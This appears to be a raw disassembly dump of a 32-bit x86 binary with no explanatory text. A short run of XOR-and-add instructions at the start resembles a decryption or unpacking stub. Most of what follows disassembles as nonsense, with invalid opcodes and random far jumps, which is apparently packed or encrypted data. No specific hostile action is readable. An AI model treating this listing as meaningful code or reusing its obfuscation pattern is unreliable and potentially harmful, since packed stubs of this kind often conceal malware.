  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a27c
  40a251:	nop
  40a252:	mov    al,0xd8
  40a254:	rol    BYTE PTR ds:0x5f4e7c7c,1
  40a25a:	jl     0x40a2d8
  40a25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a25d:	and    ebx,DWORD PTR [eax+0x27]
  40a260:	mov    ecx,0xd2d4775
  40a265:	lods   eax,DWORD PTR ds:[esi]
  40a266:	jne    0x40a221
  40a268:	and    al,0x9c
  40a26a:	inc    esp
  40a26b:	inc    BYTE PTR [ebp+0x3fd2c766]
  40a271:	ficom  DWORD PTR [edx-0x45]
  40a274:	dec    eax
  40a275:	mov    bh,0x14
  40a277:	mov    WORD PTR [ebx*8+0x790382be],es
  40a27e:	adc    BYTE PTR [edx*8+0x141bcab3],dh
  40a285:	mov    esp,0x3dfd45a9
  40a28a:	pop    ecx
  40a28b:	mov    eax,ds:0x2797046f
  40a290:	inc    ecx
  40a291:	in     eax,dx
  40a292:	sub    eax,0x42da4a38
  40a297:	push   esi
  40a298:	sahf   
  40a299:	adc    al,cl
  40a29b:	std    
  40a29c:	push   0x5921403
  40a2a1:	stos   DWORD PTR es:[edi],eax
  40a2a2:	stos   BYTE PTR es:[edi],al
  40a2a3:	dec    esp
  40a2a4:	mov    al,0x86
  40a2a6:	aaa    
  40a2a7:	mov    ebp,DWORD PTR [edi]
  40a2a9:	scas   eax,DWORD PTR es:[edi]
  40a2aa:	lds    ebx,FWORD PTR ds:0x5b2a3dab
  40a2b0:	dec    ebx
  40a2b1:	sub    al,0xbd
  40a2b3:	and    DWORD PTR [edx+0x427d859e],ebp
  40a2b9:	lods   eax,DWORD PTR ds:[esi]
  40a2ba:	enter  0x3c98,0xbd
  40a2be:	inc    ebx
  40a2bf:	aad    0xea
  40a2c1:	add    ecx,DWORD PTR [eax+ecx*4-0x34df3196]
  40a2c8:	(bad)  
  40a2c9:	and    cl,dl
  40a2cb:	jl     0x40a28f
  40a2cd:	mov    edi,0xc10d4b7b
  40a2d2:	pop    esp
  40a2d3:	mov    eax,ds:0x8c392393
  40a2d8:	pop    ebx
  40a2d9:	sbb    al,0x5
  40a2db:	inc    edx
  40a2dc:	dec    edx
  40a2dd:	sub    eax,DWORD PTR [eax+0x5b]
  40a2e0:	inc    esi
  40a2e1:	mov    al,ds:0xda9b2f13
  40a2e6:	dec    esp
  40a2e7:	shl    DWORD PTR [edx-0x1186c8ba],cl
  40a2ed:	in     eax,0xbc
  40a2ef:	frstor [edx+0x465ed2d0]
  40a2f5:	inc    edi
  40a2f6:	push   edi
  40a2f7:	and    eax,0x58e0081e
  40a2fc:	jne    0x40a281
  40a2fe:	into   
  40a2ff:	ret    
  40a300:	scas   al,BYTE PTR es:[edi]
  40a301:	cmp    DWORD PTR [ebp+eax*4-0x1693b482],ebp
  40a308:	push   edi
  40a309:	(bad)  
  40a30a:	aaa    
  40a30b:	rol    BYTE PTR [edi],0x9c
  40a30e:	(bad)  
  40a30f:	sub    eax,DWORD PTR [ebp+0xd]
  40a312:	popf   
  40a313:	and    al,0x44
  40a315:	fimul  WORD PTR [ebp+0x68]
  40a318:	daa    
  40a319:	cmp    al,0x26
  40a31b:	ret    
  40a31c:	lahf   
  40a31d:	mov    dh,0x9c
  40a31f:	xchg   edx,eax
  40a320:	pop    ss
  40a321:	call   0x9d8b3597
  40a326:	repnz rol BYTE PTR [ebp+ebp*1+0x2fd0b31b],1
  40a32e:	inc    al
  40a330:	xchg   DWORD PTR [edi-0x6fa9874c],edi
  40a336:	push   ebp
  40a337:	mov    DWORD PTR [ebx+eax*4-0x668024c4],0x26b4c652
  40a342:	sar    ebp,0x3a
  40a345:	in     eax,dx
  40a346:	mov    bl,0xfd
  40a348:	and    BYTE PTR [ebx+eax*8],ch
  40a34b:	xchg   cl,dh
  40a34d:	fdiv   DWORD PTR [edi]
  40a34f:	or     BYTE PTR ds:0x1a4eec95,al
  40a355:	jmp    0xc26:0x92b8758a
  40a35c:	jae    0x40a307
  40a35e:	mov    edx,0x7d4a16e2
  40a363:	push   ebx
  40a364:	cwde   
  40a365:	cdq    
  40a366:	jle    0x40a343
  40a368:	xchg   ebp,eax
  40a369:	pop    ebp
  40a36a:	adc    DWORD PTR [eax],0x5ee14eb1
  40a370:	fidiv  DWORD PTR [esi]
  40a372:	sub    esp,DWORD PTR [bx+si]
  40a375:	ret    
  40a376:	ret    
  40a377:	adc    BYTE PTR [eax-0x6678202a],dl
  40a37d:	jns    0x40a369
  40a37f:	cmp    esp,DWORD PTR [edi+0x5a]
  40a382:	dec    esp
  40a383:	fwait
  40a384:	cdq    
  40a385:	repnz fmul QWORD PTR [ebx]
  40a388:	jne    0x40a3d0
  40a38a:	scas   eax,DWORD PTR es:[edi]
  40a38b:	cmp    bl,BYTE PTR [eax-0xe]
  40a38e:	xor    esp,DWORD PTR [edi-0xe3791a6]
  40a394:	add    ah,dh
  40a396:	and    eax,0xa3c9aea4
  40a39b:	push   ds
  40a39c:	ja     0x40a3e1
  40a39e:	lahf   
  40a39f:	test   eax,0x8d1a70d1
  40a3a4:	dec    ebp
  40a3a5:	push   ecx
  40a3a6:	and    eax,0x5cb57f96
  40a3ab:	dec    edi
  40a3ac:	aad    0x10
  40a3ae:	loope  0x40a3e7
  40a3b0:	retf   
  40a3b1:	mov    DWORD PTR [ecx],ecx
  40a3b3:	(bad)  
  40a3b4:	jmp    0x40a34a
  40a3b6:	and    bh,BYTE PTR [edi+0x1a]
  40a3b9:	lods   al,BYTE PTR ds:[esi]
  40a3ba:	adc    esi,DWORD PTR [ebp+eax*4+0x24]
  40a3be:	call   0x17aa:0x12147ffa
  40a3c5:	fldcw  WORD PTR [ecx+0x1f]
  40a3c8:	mov    bh,0xfb
  40a3ca:	dec    esi
  40a3cb:	stos   BYTE PTR es:[edi],al
  40a3cc:	fwait
  40a3cd:	pop    es
  40a3ce:	ret    
  40a3cf:	mov    esp,0x5c0fd9a3
  40a3d4:	xlat   BYTE PTR ds:[ebx]
  40a3d5:	and    BYTE PTR [ecx-0x27],al
  40a3d8:	pushf  
  40a3d9:	imul   ecx,DWORD PTR [edx+edx*1+0x16],0x36979a32
  40a3e1:	enter  0x6f05,0x71
  40a3e5:	shr    DWORD PTR [ebx+edi*8],cl
  40a3e8:	imul   ebx,DWORD PTR [esi],0xd86e46f1
  40a3ee:	adc    BYTE PTR [edx+0x3f],cl
  40a3f1:	setne  bl
  40a3f4:	mul    BYTE PTR [edx+0x61]
  40a3f7:	and    bh,BYTE PTR [ebx+0x5c46ba18]
  40a3fd:	or     dh,BYTE PTR [ecx+0x5296a316]
  40a403:	repz popa 
  40a405:	mov    WORD PTR [ecx-0x5a],gs
  40a408:	cld    
  40a409:	int    0xa0
  40a40b:	jle    0x40a3e7
  40a40d:	push   ecx
  40a40e:	inc    edx
  40a40f:	jns    0x40a40a
  40a411:	ret    0xe326
  40a414:	add    BYTE PTR [edx-0x76],bh
  40a417:	adc    eax,0x3387b6e9
  40a41c:	and    BYTE PTR [ebx-0x1eeb48c6],0x62
  40a423:	pop    edi
  40a424:	ret    0x3ef6
  40a427:	push   ebp
  40a428:	fild   QWORD PTR [edx]
  40a42a:	(bad)  
  40a42b:	and    al,0x5b
  40a42d:	dec    ecx
  40a42e:	jmp    0xa263:0x4f3de8dd
  40a435:	push   es
  40a436:	fistp  WORD PTR [edx+0x5b]
  40a439:	pop    ds
  40a43a:	mov    ebx,0xb1c194b7
  40a43f:	or     DWORD PTR ds:0x12ace317,0xd272a594
  40a449:	pop    esp
  40a44a:	mov    esp,0x65c088c4
  40a44f:	pop    esi
  40a450:	xchg   edx,eax
  40a451:	mov    cl,0xbf
  40a453:	cli    
  40a454:	in     eax,0x52
  40a456:	ret    0x36ae
  40a459:	and    ebx,DWORD PTR [edi+0xc]
  40a45c:	inc    ebx
  40a45d:	inc    ebx
  40a45e:	shl    edi,1
  40a460:	loop   0x40a429
  40a462:	stos   BYTE PTR es:[edi],al
  40a463:	jae    0x40a42b
  40a465:	(bad)  
  40a466:	or     BYTE PTR [ecx],dl
  40a468:	stc    
  40a469:	daa    
  40a46a:	push   cs
  40a46b:	adc    edi,0xfffffff6
  40a46e:	(bad)  
  40a46f:	jmp    0x2f1b:0xbee4cb7a
  40a476:	stos   DWORD PTR es:[edi],eax
  40a477:	loop   0x40a49d
  40a479:	and    DWORD PTR [edx],ecx
  40a47b:	mov    ah,0x2
  40a47d:	stos   DWORD PTR es:[edi],eax
  40a47e:	dec    esp
  40a47f:	(bad)  
  40a480:	int3   
  40a481:	mov    ebx,0xf65c1386
  40a486:	cdq    
  40a487:	out    0x5d,al
  40a489:	jnp    0x40a4d3
  40a48b:	pop    esi
  40a48c:	xor    al,0x1e
  40a48e:	jp     0x40a4a9
  40a490:	mov    ecx,0xb1b24665
  40a495:	push   cs
  40a496:	cmp    eax,DWORD PTR [esp+eax*4-0x76]
  40a49a:	sub    al,0x65
  40a49c:	add    ch,cl
  40a49e:	adc    al,0x75
  40a4a0:	popf   
  40a4a1:	push   cs
  40a4a2:	push   ebx
  40a4a3:	out    dx,eax
  40a4a4:	arpl   WORD PTR [ecx-0x5a],ax
  40a4a7:	dec    edx
  40a4a8:	xchg   esi,esi
  40a4aa:	xchg   esp,eax
  40a4ab:	jecxz  0x40a452
  40a4ad:	(bad)  
  40a4ae:	ret    
  40a4af:	icebp  
  40a4b0:	xor    cl,BYTE PTR [edx+0x6865b283]
  40a4b6:	mov    bl,ch
  40a4b8:	imul   ebx,DWORD PTR [edi+0x2cc921bd],0xffffffe9
  40a4bf:	stos   DWORD PTR es:[edi],eax
  40a4c0:	retf   0xbdcd
  40a4c3:	and    al,0x12
  40a4c5:	test   DWORD PTR [esi+ecx*4+0x4b10e31e],ecx
  40a4cc:	sbb    al,0xd2
  40a4ce:	or     ecx,DWORD PTR [ebx]
  40a4d0:	pushfw 
  40a4d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4d3:	outs   dx,DWORD PTR ds:[esi]
  40a4d4:	sbb    BYTE PTR [edi-0x71],ch
  40a4d7:	adc    BYTE PTR [esi+esi*4+0x1c],ch
  40a4db:	xor    DWORD PTR [esi+0x74],edi
  40a4de:	(bad)  
  40a4df:	sti    
  40a4e0:	or     eax,0x649762f3
  40a4e5:	xchg   esp,eax
  40a4e6:	out    0x48,eax
  40a4e8:	jg     0x40a4c7
  40a4ea:	xchg   esp,eax
  40a4eb:	push   0x8ca671fa
  40a4f0:	push   eax
  40a4f1:	or     cl,BYTE PTR [edi-0x12]
  40a4f4:	fmulp  st(7),st
  40a4f6:	call   0x5cd3:0xc38a20fd
  40a4fd:	or     ebx,DWORD PTR [edi+0x68]
  40a500:	mov    ah,0x1d
  40a502:	jnp    0x40a4fe
  40a504:	sbb    dh,BYTE PTR [ecx-0x1a]
  40a507:	inc    edx
  40a508:	outs   dx,BYTE PTR ds:[esi]
  40a509:	or     al,0xbd
  40a50b:	(bad)  
  40a50c:	enter  0x913,0xc4
  40a510:	mov    esi,0x46cd0e3d
  40a515:	pop    ecx
  40a516:	adc    al,0x28
  40a518:	dec    esp
  40a519:	outs   dx,DWORD PTR ds:[esi]
  40a51a:	outs   dx,DWORD PTR ds:[esi]
  40a51b:	add    DWORD PTR [eax],edx
  40a51d:	(bad)  
  40a51e:	jmp    0x40a541
  40a520:	and    ecx,edx
  40a522:	xlat   BYTE PTR ds:[ebx]
  40a523:	xchg   edx,eax
  40a524:	lahf   
  40a525:	jb     0x40a5a2
  40a527:	inc    esi
  40a528:	daa    
  40a529:	push   ds
  40a52a:	mov    eax,ds:0x8bde17ab
  40a52f:	xor    bl,bl
  40a531:	cmp    bh,BYTE PTR [esi+0x64]
  40a534:	xchg   esp,eax
  40a535:	gs je  0x40a4bc
  40a538:	jae    0x40a56d
  40a53a:	gs push 0x0
  40a53d:	lea    esi,[eax-0x4f8fdbf7]
  40a543:	sbb    DWORD PTR [edi],0x3088682f
  40a549:	jmp    0x9b30d185
  40a54e:	jmp    0x8963:0xa0e7e530
  40a555:	jecxz  0x40a553
  40a557:	test   al,0xac
  40a559:	int3   
  40a55a:	(bad)  
  40a55b:	fnstcw WORD PTR [esi]
  40a55d:	pop    ds
  40a55e:	jne    0x40a552
  40a560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a561:	sub    BYTE PTR [eax+0x28],ch
  40a564:	adc    al,0x38
  40a566:	lea    ecx,[edx]
  40a568:	jae    0x40a5cb
  40a56a:	jmp    0x40a571
  40a56c:	ret    
  40a56d:	stos   DWORD PTR es:[edi],eax
  40a56e:	push   esp
  40a56f:	xor    DWORD PTR [ecx+0x29],edi
  40a572:	stc    
  40a573:	dec    esi
  40a574:	js     0x40a59a
  40a576:	(bad)  
  40a579:	iret   
  40a57a:	inc    edi
  40a57b:	frstor [ecx+ebp*8-0xcb8afde]
  40a582:	nop
  40a583:	push   0x7e
  40a585:	and    eax,0x1697a1a4
  40a58a:	and    ecx,ebp
  40a58c:	int3   
  40a58d:	test   BYTE PTR [ecx+0x47f144ba],dl
  40a593:	lahf   
  40a594:	cmp    DWORD PTR [edx],esp
  40a596:	sub    BYTE PTR ss:[esi+0x24],cl
  40a59a:	(bad)  
  40a59b:	das    
  40a59c:	add    eax,DWORD PTR [edi+esi*2-0x4f]
  40a5a0:	mov    bh,0x5b
  40a5a2:	mov    dl,dl
  40a5a4:	js     0x40a5f1
  40a5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5a7:	sbb    esp,DWORD PTR [ebx+0x50aaf7c1]
  40a5ad:	aam    0xd8
  40a5af:	loopne 0x40a5c4
  40a5b1:	popa   
  40a5b2:	push   ds
  40a5b3:	add    eax,0xb04783c2
  40a5b8:	inc    ebp
  40a5b9:	jo     0x40a5be
  40a5bb:	call   0xcfcd2e45
  40a5c0:	out    dx,al
  40a5c1:	cmp    DWORD PTR [edx-0x44590c03],ecx
  40a5c7:	sub    al,0xe7
  40a5c9:	pop    edi
  40a5ca:	shr    BYTE PTR [edx-0x5a],cl
  40a5cd:	and    eax,0x1456aa8c
  40a5d2:	pop    ecx
  40a5d3:	jmp    0x31d2:0x97769cc
  40a5da:	sbb    ebx,DWORD PTR [esi]
  40a5dc:	outs   dx,DWORD PTR ds:[esi]
  40a5dd:	fwait
  40a5de:	xchg   esp,eax
  40a5e0:	add    BYTE PTR [eax-0x715ee9f],dh
  40a5e6:	pop    ecx
  40a5e7:	imul   esp,DWORD PTR [eax-0x2a],0xffffff85
  40a5eb:	shl    BYTE PTR [ecx+0x13],cl
  40a5ee:	aaa    
  40a5ef:	mov    BYTE PTR [esi],bl
  40a5f1:	dec    edi
  40a5f2:	es adc dl,cl
  40a5f5:	mov    eax,ds:0x4b5fde66
  40a5fa:	dec    eax
  40a5fb:	sbb    eax,0xeb1d2e55
  40a600:	jo     0x40a622
  40a602:	je     0x40a5fa
  40a604:	cs inc esp
  40a606:	stc    
  40a607:	lock and al,0x7b
  40a60a:	test   eax,0x47a3e8c4
  40a60f:	outs   dx,DWORD PTR ds:[esi]
  40a610:	scas   eax,DWORD PTR es:[edi]
  40a611:	into   
  40a612:	mov    al,0xcd
  40a614:	icebp  
  40a615:	xlat   BYTE PTR ds:[ebx]
  40a616:	(bad)
  40a61a:	mov    ds:0xace4337e,al
  40a61f:	or     DWORD PTR [esi+eiz*8-0x1d],ebx
  40a623:	and    DWORD PTR [ebx-0x6],ebx
  40a626:	xor    al,0x22
  40a628:	call   0x68f8d956
  40a62d:	jle    0x40a65c
  40a62f:	add    dh,dl
  40a631:	das    
  40a632:	mov    eax,DWORD PTR [ebx]
  40a634:	inc    edx
  40a635:	imul   esi,DWORD PTR [ecx+0x1],0xeaf357d4
  40a63c:	cs ret 
  40a63e:	sbb    al,0x88
  40a640:	ins    DWORD PTR es:[edi],dx
  40a641:	xchg   BYTE PTR [edx+0x6f],ah
  40a644:	jmp    0xafb28693
  40a649:	(bad)  
  40a64a:	mov    esi,0x7dbe0704
  40a64f:	cld    
  40a650:	xchg   ebp,eax
  40a651:	cmp    BYTE PTR [ecx+edx*2],dh
  40a654:	ins    DWORD PTR es:[edi],dx
  40a655:	popf   
  40a656:	push   0xd5315463
  40a65b:	jmp    0xae57d185
  40a660:	mov    eax,0x7259b09c
  40a665:	les    esi,FWORD PTR [esi]
  40a667:	std    
  40a668:	ss pop ss
  40a66a:	pop    ds
  40a66b:	hlt    
  40a66c:	adc    al,0x90
  40a66e:	mov    ebx,0xb00f0251
  40a673:	cmp    eax,0xd645abea
  40a678:	push   cs
  40a679:	scas   al,BYTE PTR es:[edi]
  40a67a:	jbe    0x40a631
  40a67c:	imul   esp,esp,0xffffff84
  40a67f:	pushf  
  40a680:	mov    ch,0x31
  40a682:	fldenv [ecx-0x58]
  40a685:	ret    
  40a686:	cmp    esi,ebp
  40a688:	inc    esp
  40a689:	call   0x8fa2:0x394d247a
  40a690:	ret    0x8222
  40a693:	xlat   BYTE PTR ds:[ebx]
  40a694:	jecxz  0x40a617
  40a696:	ret    
  40a697:	and    eax,DWORD PTR [edx-0x3e13c94c]
  40a69d:	jmp    0xe98b8a5b
  40a6a2:	fwait
  40a6a3:	jge    0x40a66d
  40a6a5:	call   0x9d290622
  40a6aa:	sbb    dl,BYTE PTR [edx+0x11d57f79]
  40a6b0:	pop    ecx
  40a6b1:	add    BYTE PTR [ecx+0x33],cl
  40a6b4:	je     0x40a705
  40a6b6:	test   DWORD PTR [eax-0x7280680c],ebx
  40a6bc:	int    0x72
  40a6be:	lahf   
  40a6bf:	mov    ch,0x7d
  40a6c1:	sub    ebx,DWORD PTR [edx]
  40a6c3:	sub    DWORD PTR [edi],esi
  40a6c5:	dec    esi
  40a6c6:	pop    edx
  40a6c7:	lock and BYTE PTR [esi+0x471d959f],al
  40a6ce:	inc    edi
  40a6cf:	push   DWORD PTR [eax]
  40a6d1:	push   esi
  40a6d2:	pop    eax
  40a6d3:	mov    ebx,?
  40a6d5:	mov    eax,0x96406ab
  40a6da:	jg     0x40a6f7
  40a6dc:	out    dx,al
  40a6dd:	pop    es
  40a6de:	push   0xd3b0fe76
  40a6e3:	repnz mov dh,0x30
  40a6e6:	jg     0x40a6f1
  40a6e8:	scas   eax,DWORD PTR es:[edi]
  40a6e9:	adc    al,0x5b
  40a6eb:	jp     0x40a751
  40a6ed:	lods   al,BYTE PTR ds:[esi]
  40a6ee:	or     al,0x13
  40a6f0:	(bad)  
  40a6f1:	adc    ebx,DWORD PTR [edi+0x7e]
  40a6f4:	mov    ecx,0x8a1c2f1d
  40a6f9:	adc    al,BYTE PTR [edx-0x48]
  40a6fc:	adc    esi,DWORD PTR [edx-0x6c]
  40a6ff:	adc    ebx,0x1647a238
  40a705:	or     DWORD PTR [edx+0x1db76741],esp
  40a70b:	hlt    
  40a70c:	rcl    DWORD PTR [ebx+0x1275861a],1
  40a712:	data16 and ah,BYTE PTR [esi]
  40a715:	jge    0x40a716
  40a717:	out    0x3c,eax
  40a719:	add    edi,DWORD PTR [esi+0x36]
  40a71c:	loope  0x40a737
  40a71e:	fadd   DWORD PTR [ebx+0x3ce6e403]
  40a724:	fmul   DWORD PTR [edi-0x33]
  40a727:	cvtps2pi mm2,QWORD PTR [edi]
  40a72a:	and    dh,BYTE PTR [esi-0x2]
  40a72d:	and    dh,ah
  40a72f:	int    0x54
  40a731:	sbb    eax,0x9d7020bb
  40a736:	jp     0x40a6f2
  40a738:	cmp    BYTE PTR [edx],dl
  40a73a:	add    al,0xb5
  40a73c:	outs   dx,BYTE PTR ds:[esi]
  40a73d:	push   ebp
  40a73e:	sub    DWORD PTR [ebx],esi
  40a740:	adc    al,0xbb
  40a742:	aad    0x1f
  40a744:	pop    esi
  40a745:	mov    ch,0xe
  40a747:	mov    ss,WORD PTR [eax]
  40a749:	inc    ecx
  40a74a:	and    ch,BYTE PTR [ebp+0x21]
  40a74d:	mov    ebp,cs
  40a74f:	(bad)  
  40a750:	pop    esi
  40a751:	ins    BYTE PTR es:[edi],dx
  40a752:	mov    edx,DWORD PTR [edi]
  40a754:	aaa    
  40a755:	in     al,dx
  40a756:	lock inc esi
  40a758:	inc    ecx
  40a759:	and    bh,BYTE PTR [esi+0x6e247a84]
  40a75f:	sbb    ebx,DWORD PTR [edi-0x1d]
  40a762:	fmul   st,st(1)
  40a764:	mov    ebp,0xfc992e2e
  40a769:	cli    
  40a76a:	jns    0x40a748
  40a76c:	leave  
  40a76d:	add    BYTE PTR [eax],dh
  40a76f:	sub    al,0xfe
  40a771:	add    BYTE PTR ds:0x82edb1ad,dl
  40a777:	xchg   esp,eax
  40a778:	scas   eax,DWORD PTR es:[edi]
  40a779:	in     eax,0x26
  40a77b:	adc    DWORD PTR [edi],esp
  40a77d:	xor    edx,DWORD PTR [edx]
  40a77f:	sbb    DWORD PTR [esi+0x5b],ecx
  40a782:	data16 add al,0xf6
  40a785:	arpl   WORD PTR [ecx-0x34bdff29],ax
  40a78b:	jns    0x40a7c3
  40a78d:	mov    ecx,ecx
  40a78f:	mov    dh,BYTE PTR [edx+0x39b5be15]
  40a795:	loope  0x40a796
  40a797:	inc    dl
  40a799:	popf   
  40a79a:	addr16 xchg ebx,eax
  40a79c:	pop    ebx
  40a79d:	lds    ebp,FWORD PTR [eax]
  40a79f:	sbb    DWORD PTR [eax],edx
  40a7a1:	and    DWORD PTR [edx-0x76c3b760],eax
  40a7a7:	or     bl,BYTE PTR [edi+0x19]
  40a7aa:	popf   
  40a7ab:	and    BYTE PTR [ebx-0x63],0xef
  40a7af:	ins    DWORD PTR es:[edi],dx
  40a7b0:	mov    al,ds:0x24471373
  40a7b5:	add    BYTE PTR [ecx+esi*8-0x48bb730c],0xc9
  40a7bd:	in     al,dx
  40a7be:	fs sahf 
  40a7c0:	call   0x51e8563e
  40a7c5:	sbb    al,0xd6
  40a7c7:	jnp    0x40a7fb
  40a7c9:	ret    
  40a7ca:	cmp    al,0x1d
  40a7cc:	sub    BYTE PTR [edx+ebx*2-0x4c164651],0x4a
  40a7d4:	mov    ds:0x59de213b,al
  40a7d9:	xlat   BYTE PTR ds:[ebx]
  40a7da:	inc    esi
  40a7db:	sbb    DWORD PTR [eax],eax
  40a7dd:	ret    0x59ab
  40a7e0:	or     BYTE PTR [eax+0x3e],cl
  40a7e3:	(bad)  
  40a7e4:	in     al,dx
  40a7e5:	xor    al,0xda
  40a7e7:	mov    ch,0xd3
  40a7e9:	sub    DWORD PTR [eax+0x47],esi
  40a7ec:	mov    dh,0x9
  40a7ee:	dec    edx
  40a7ef:	(bad)  
  40a7f0:	fwait
  40a7f1:	adc    BYTE PTR [ebp-0x7731ed5e],dl
  40a7f7:	test   eax,0xd396e461
  40a7fc:	and    BYTE PTR [edi-0x6e1450fb],bh
  40a802:	es dec edi
  40a804:	mov    ds:0x5cd57f9d,eax
  40a809:	sbb    al,0xae
  40a80b:	sub    esi,DWORD PTR [ebx]
  40a80d:	add    cl,cl
  40a80f:	pop    ds
  40a810:	mov    ds:0x41cd881c,ax
  40a816:	hlt    
  40a817:	cs aas 
  40a819:	xchg   DWORD PTR [ecx-0x520a5f06],edi
  40a81f:	inc    esi
  40a820:	mov    eax,es:0xfed33383
  40a826:	outs   dx,DWORD PTR ds:[esi]
  40a827:	mov    WORD PTR [ebx+0x73c02f99],ds
  40a82d:	push   0x68
  40a82f:	mov    eax,0xd30a3f3c
  40a834:	cmp    eax,DWORD PTR [eax+0x48a5256e]
  40a83a:	or     bl,dl
  40a83c:	jle    0x40a8b9
  40a83e:	neg    BYTE PTR [esp+eax*2]
  40a841:	mov    bh,0x6c
  40a843:	jg     0x40a832
  40a845:	je     0x40a83b
  40a847:	add    DWORD PTR [ebx],ebx
  40a849:	xchg   BYTE PTR [ecx],cl
  40a84b:	aam    0xba
  40a84d:	cmp    DWORD PTR [esi],esp
  40a84f:	jns    0x40a892
  40a851:	test   al,0xd2
  40a853:	dec    esi
  40a854:	inc    eax
  40a855:	in     eax,dx
  40a856:	xchg   ecx,eax
  40a857:	mov    ds:0xd99657a7,al
  40a85c:	adc    al,0x28
  40a85e:	std    
  40a85f:	ins    BYTE PTR es:[edi],dx
  40a860:	les    ecx,FWORD PTR [edi]
  40a862:	leave  
  40a863:	dec    edi
  40a864:	mov    ecx,DWORD PTR [ebx-0x17]
  40a867:	iret   
  40a868:	xlat   BYTE PTR ds:[ebx]
  40a869:	into   
  40a86a:	jl     0x40a829
  40a86c:	loopne 0x40a8c9
  40a86e:	fstp   DWORD PTR [edx+0x4c0d22ed]
  40a874:	sahf   
  40a875:	jo     0x40a85a
  40a877:	sub    al,0x68
  40a879:	mov    dl,0x9a
  40a87b:	dec    esi
  40a87c:	sbb    BYTE PTR ss:[esi+0x5f06879e],0x1a
  40a884:	out    dx,eax
  40a885:	add    cl,bh
  40a887:	hlt    
  40a888:	stos   DWORD PTR es:[edi],eax
  40a889:	sbb    BYTE PTR [ecx],cl
  40a88b:	bound  edi,QWORD PTR [edi+esi*4+0xcecafee]
  40a892:	add    al,0x1c
  40a894:	leave  
  40a895:	scas   al,BYTE PTR es:[edi]
  40a896:	xor    esi,DWORD PTR [ecx+0x158be428]
  40a89c:	fcom   DWORD PTR [ebp-0x26]
  40a89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a0:	movaps xmm5,XMMWORD PTR [ecx]
  40a8a3:	adc    al,0xc5
  40a8a5:	retf   
  40a8a6:	cdq    
  40a8a7:	pop    ds
  40a8a8:	pop    ds
  40a8a9:	or     ecx,DWORD PTR [ebx+eiz*4-0x7f7902e9]
  40a8b0:	dec    ebp
  40a8b1:	mov    esp,0x3a57c1c0
  40a8b6:	js     0x40a860
  40a8b8:	xchg   BYTE PTR [ecx+0x38],cl
  40a8bb:	(bad)  
  40a8bc:	ins    DWORD PTR es:[edi],dx
  40a8bd:	(bad)  
  40a8be:	or     eax,0xa058bc7f
  40a8c3:	xchg   esp,eax
  40a8c4:	ror    DWORD PTR [ebx+0x12a5e21b],0x71
  40a8cb:	push   0x5014c483
  40a8d0:	test   eax,0x20e8697e
  40a8d5:	clc    
  40a8d6:	jns    0x40a951
  40a8d8:	sahf   
  40a8d9:	push   cs
  40a8da:	adc    edx,ebp
  40a8dc:	daa    
  40a8dd:	xchg   ecx,eax
  40a8de:	adc    BYTE PTR [edx],dh
  40a8e0:	pop    ebp
  40a8e1:	jo     0x40a922
  40a8e3:	sub    ebp,esi
  40a8e5:	cs push 0xffffffbb
  40a8e8:	add    DWORD PTR [esi+0x36],0x8ae00ef1
  40a8ef:	pop    eax
  40a8f0:	cmp    cl,BYTE PTR [edx-0x40f70da8]
  40a8f6:	xor    ebx,DWORD PTR [edi+eiz*1]
  40a8f9:	je     0x40a8f8
  40a8fb:	cmp    DWORD PTR [edi-0x2da67be4],esi
  40a901:	ins    DWORD PTR es:[edi],dx
  40a902:	pop    esi
  40a903:	pop    ebx
  40a904:	iret   
  40a905:	sub    al,0x6f
  40a907:	or     eax,0x3aff96e5
  40a90c:	iret   
  40a90d:	xchg   ebx,eax
  40a90e:	stc    
  40a90f:	mov    esp,es
  40a911:	and    bl,BYTE PTR [ebp+0x351daf7f]
  40a917:	sub    ch,BYTE PTR [edx]
  40a919:	outs   dx,DWORD PTR ds:[esi]
  40a91a:	pop    es
  40a91b:	hlt    
  40a91c:	add    eax,0xb3db1b1
  40a921:	xchg   ebp,eax
  40a922:	cmp    al,0xa7
  40a924:	push   0x1c
  40a926:	or     BYTE PTR [ecx],dh
  40a928:	aas    
  40a929:	repz pop ebx
  40a92b:	pop    ds
  40a92c:	pusha  
  40a92d:	fadd   DWORD PTR [eax+0x26]
  40a930:	sub    eax,0x6a9e7ed2
  40a935:	std    
  40a936:	fwait
  40a937:	xor    ch,bl
  40a939:	lock stc 
  40a93b:	pop    es
  40a93c:	adc    DWORD PTR [ebx+0x5bcfa542],esp
  40a942:	lds    eax,FWORD PTR [ebp-0x38661a72]
  40a948:	int    0x3b
  40a94a:	sub    edi,ebx
  40a94c:	sub    al,0xc9
  40a94e:	dec    ebx
  40a94f:	jge    0x40a936
  40a951:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a952:	or     al,0xf
  40a954:	add    dl,BYTE PTR [ecx+0x76]
  40a957:	addr16 daa 
  40a959:	fisub  WORD PTR [edx-0x728ba1a5]
  40a95f:	and    ecx,esp
  40a961:	sbb    BYTE PTR [esi],ch
  40a963:	or     al,0xe7
  40a965:	or     BYTE PTR [edi-0x59],0xa6
  40a969:	xchg   BYTE PTR [ecx-0x42a55df1],bh
  40a96f:	sub    DWORD PTR [esi+0x29],eax
  40a972:	push   eax
  40a973:	or     DWORD PTR [eax-0xa351151],ecx
  40a979:	pop    edx
  40a97a:	cwde   
  40a97b:	add    BYTE PTR [eax+0x3690da3a],bl
  40a981:	add    cl,BYTE PTR [eax+0x28efc57]
  40a987:	xchg   ebp,eax
  40a988:	jns    0x40aa07
  40a98a:	xchg   ebp,eax
  40a98b:	das    
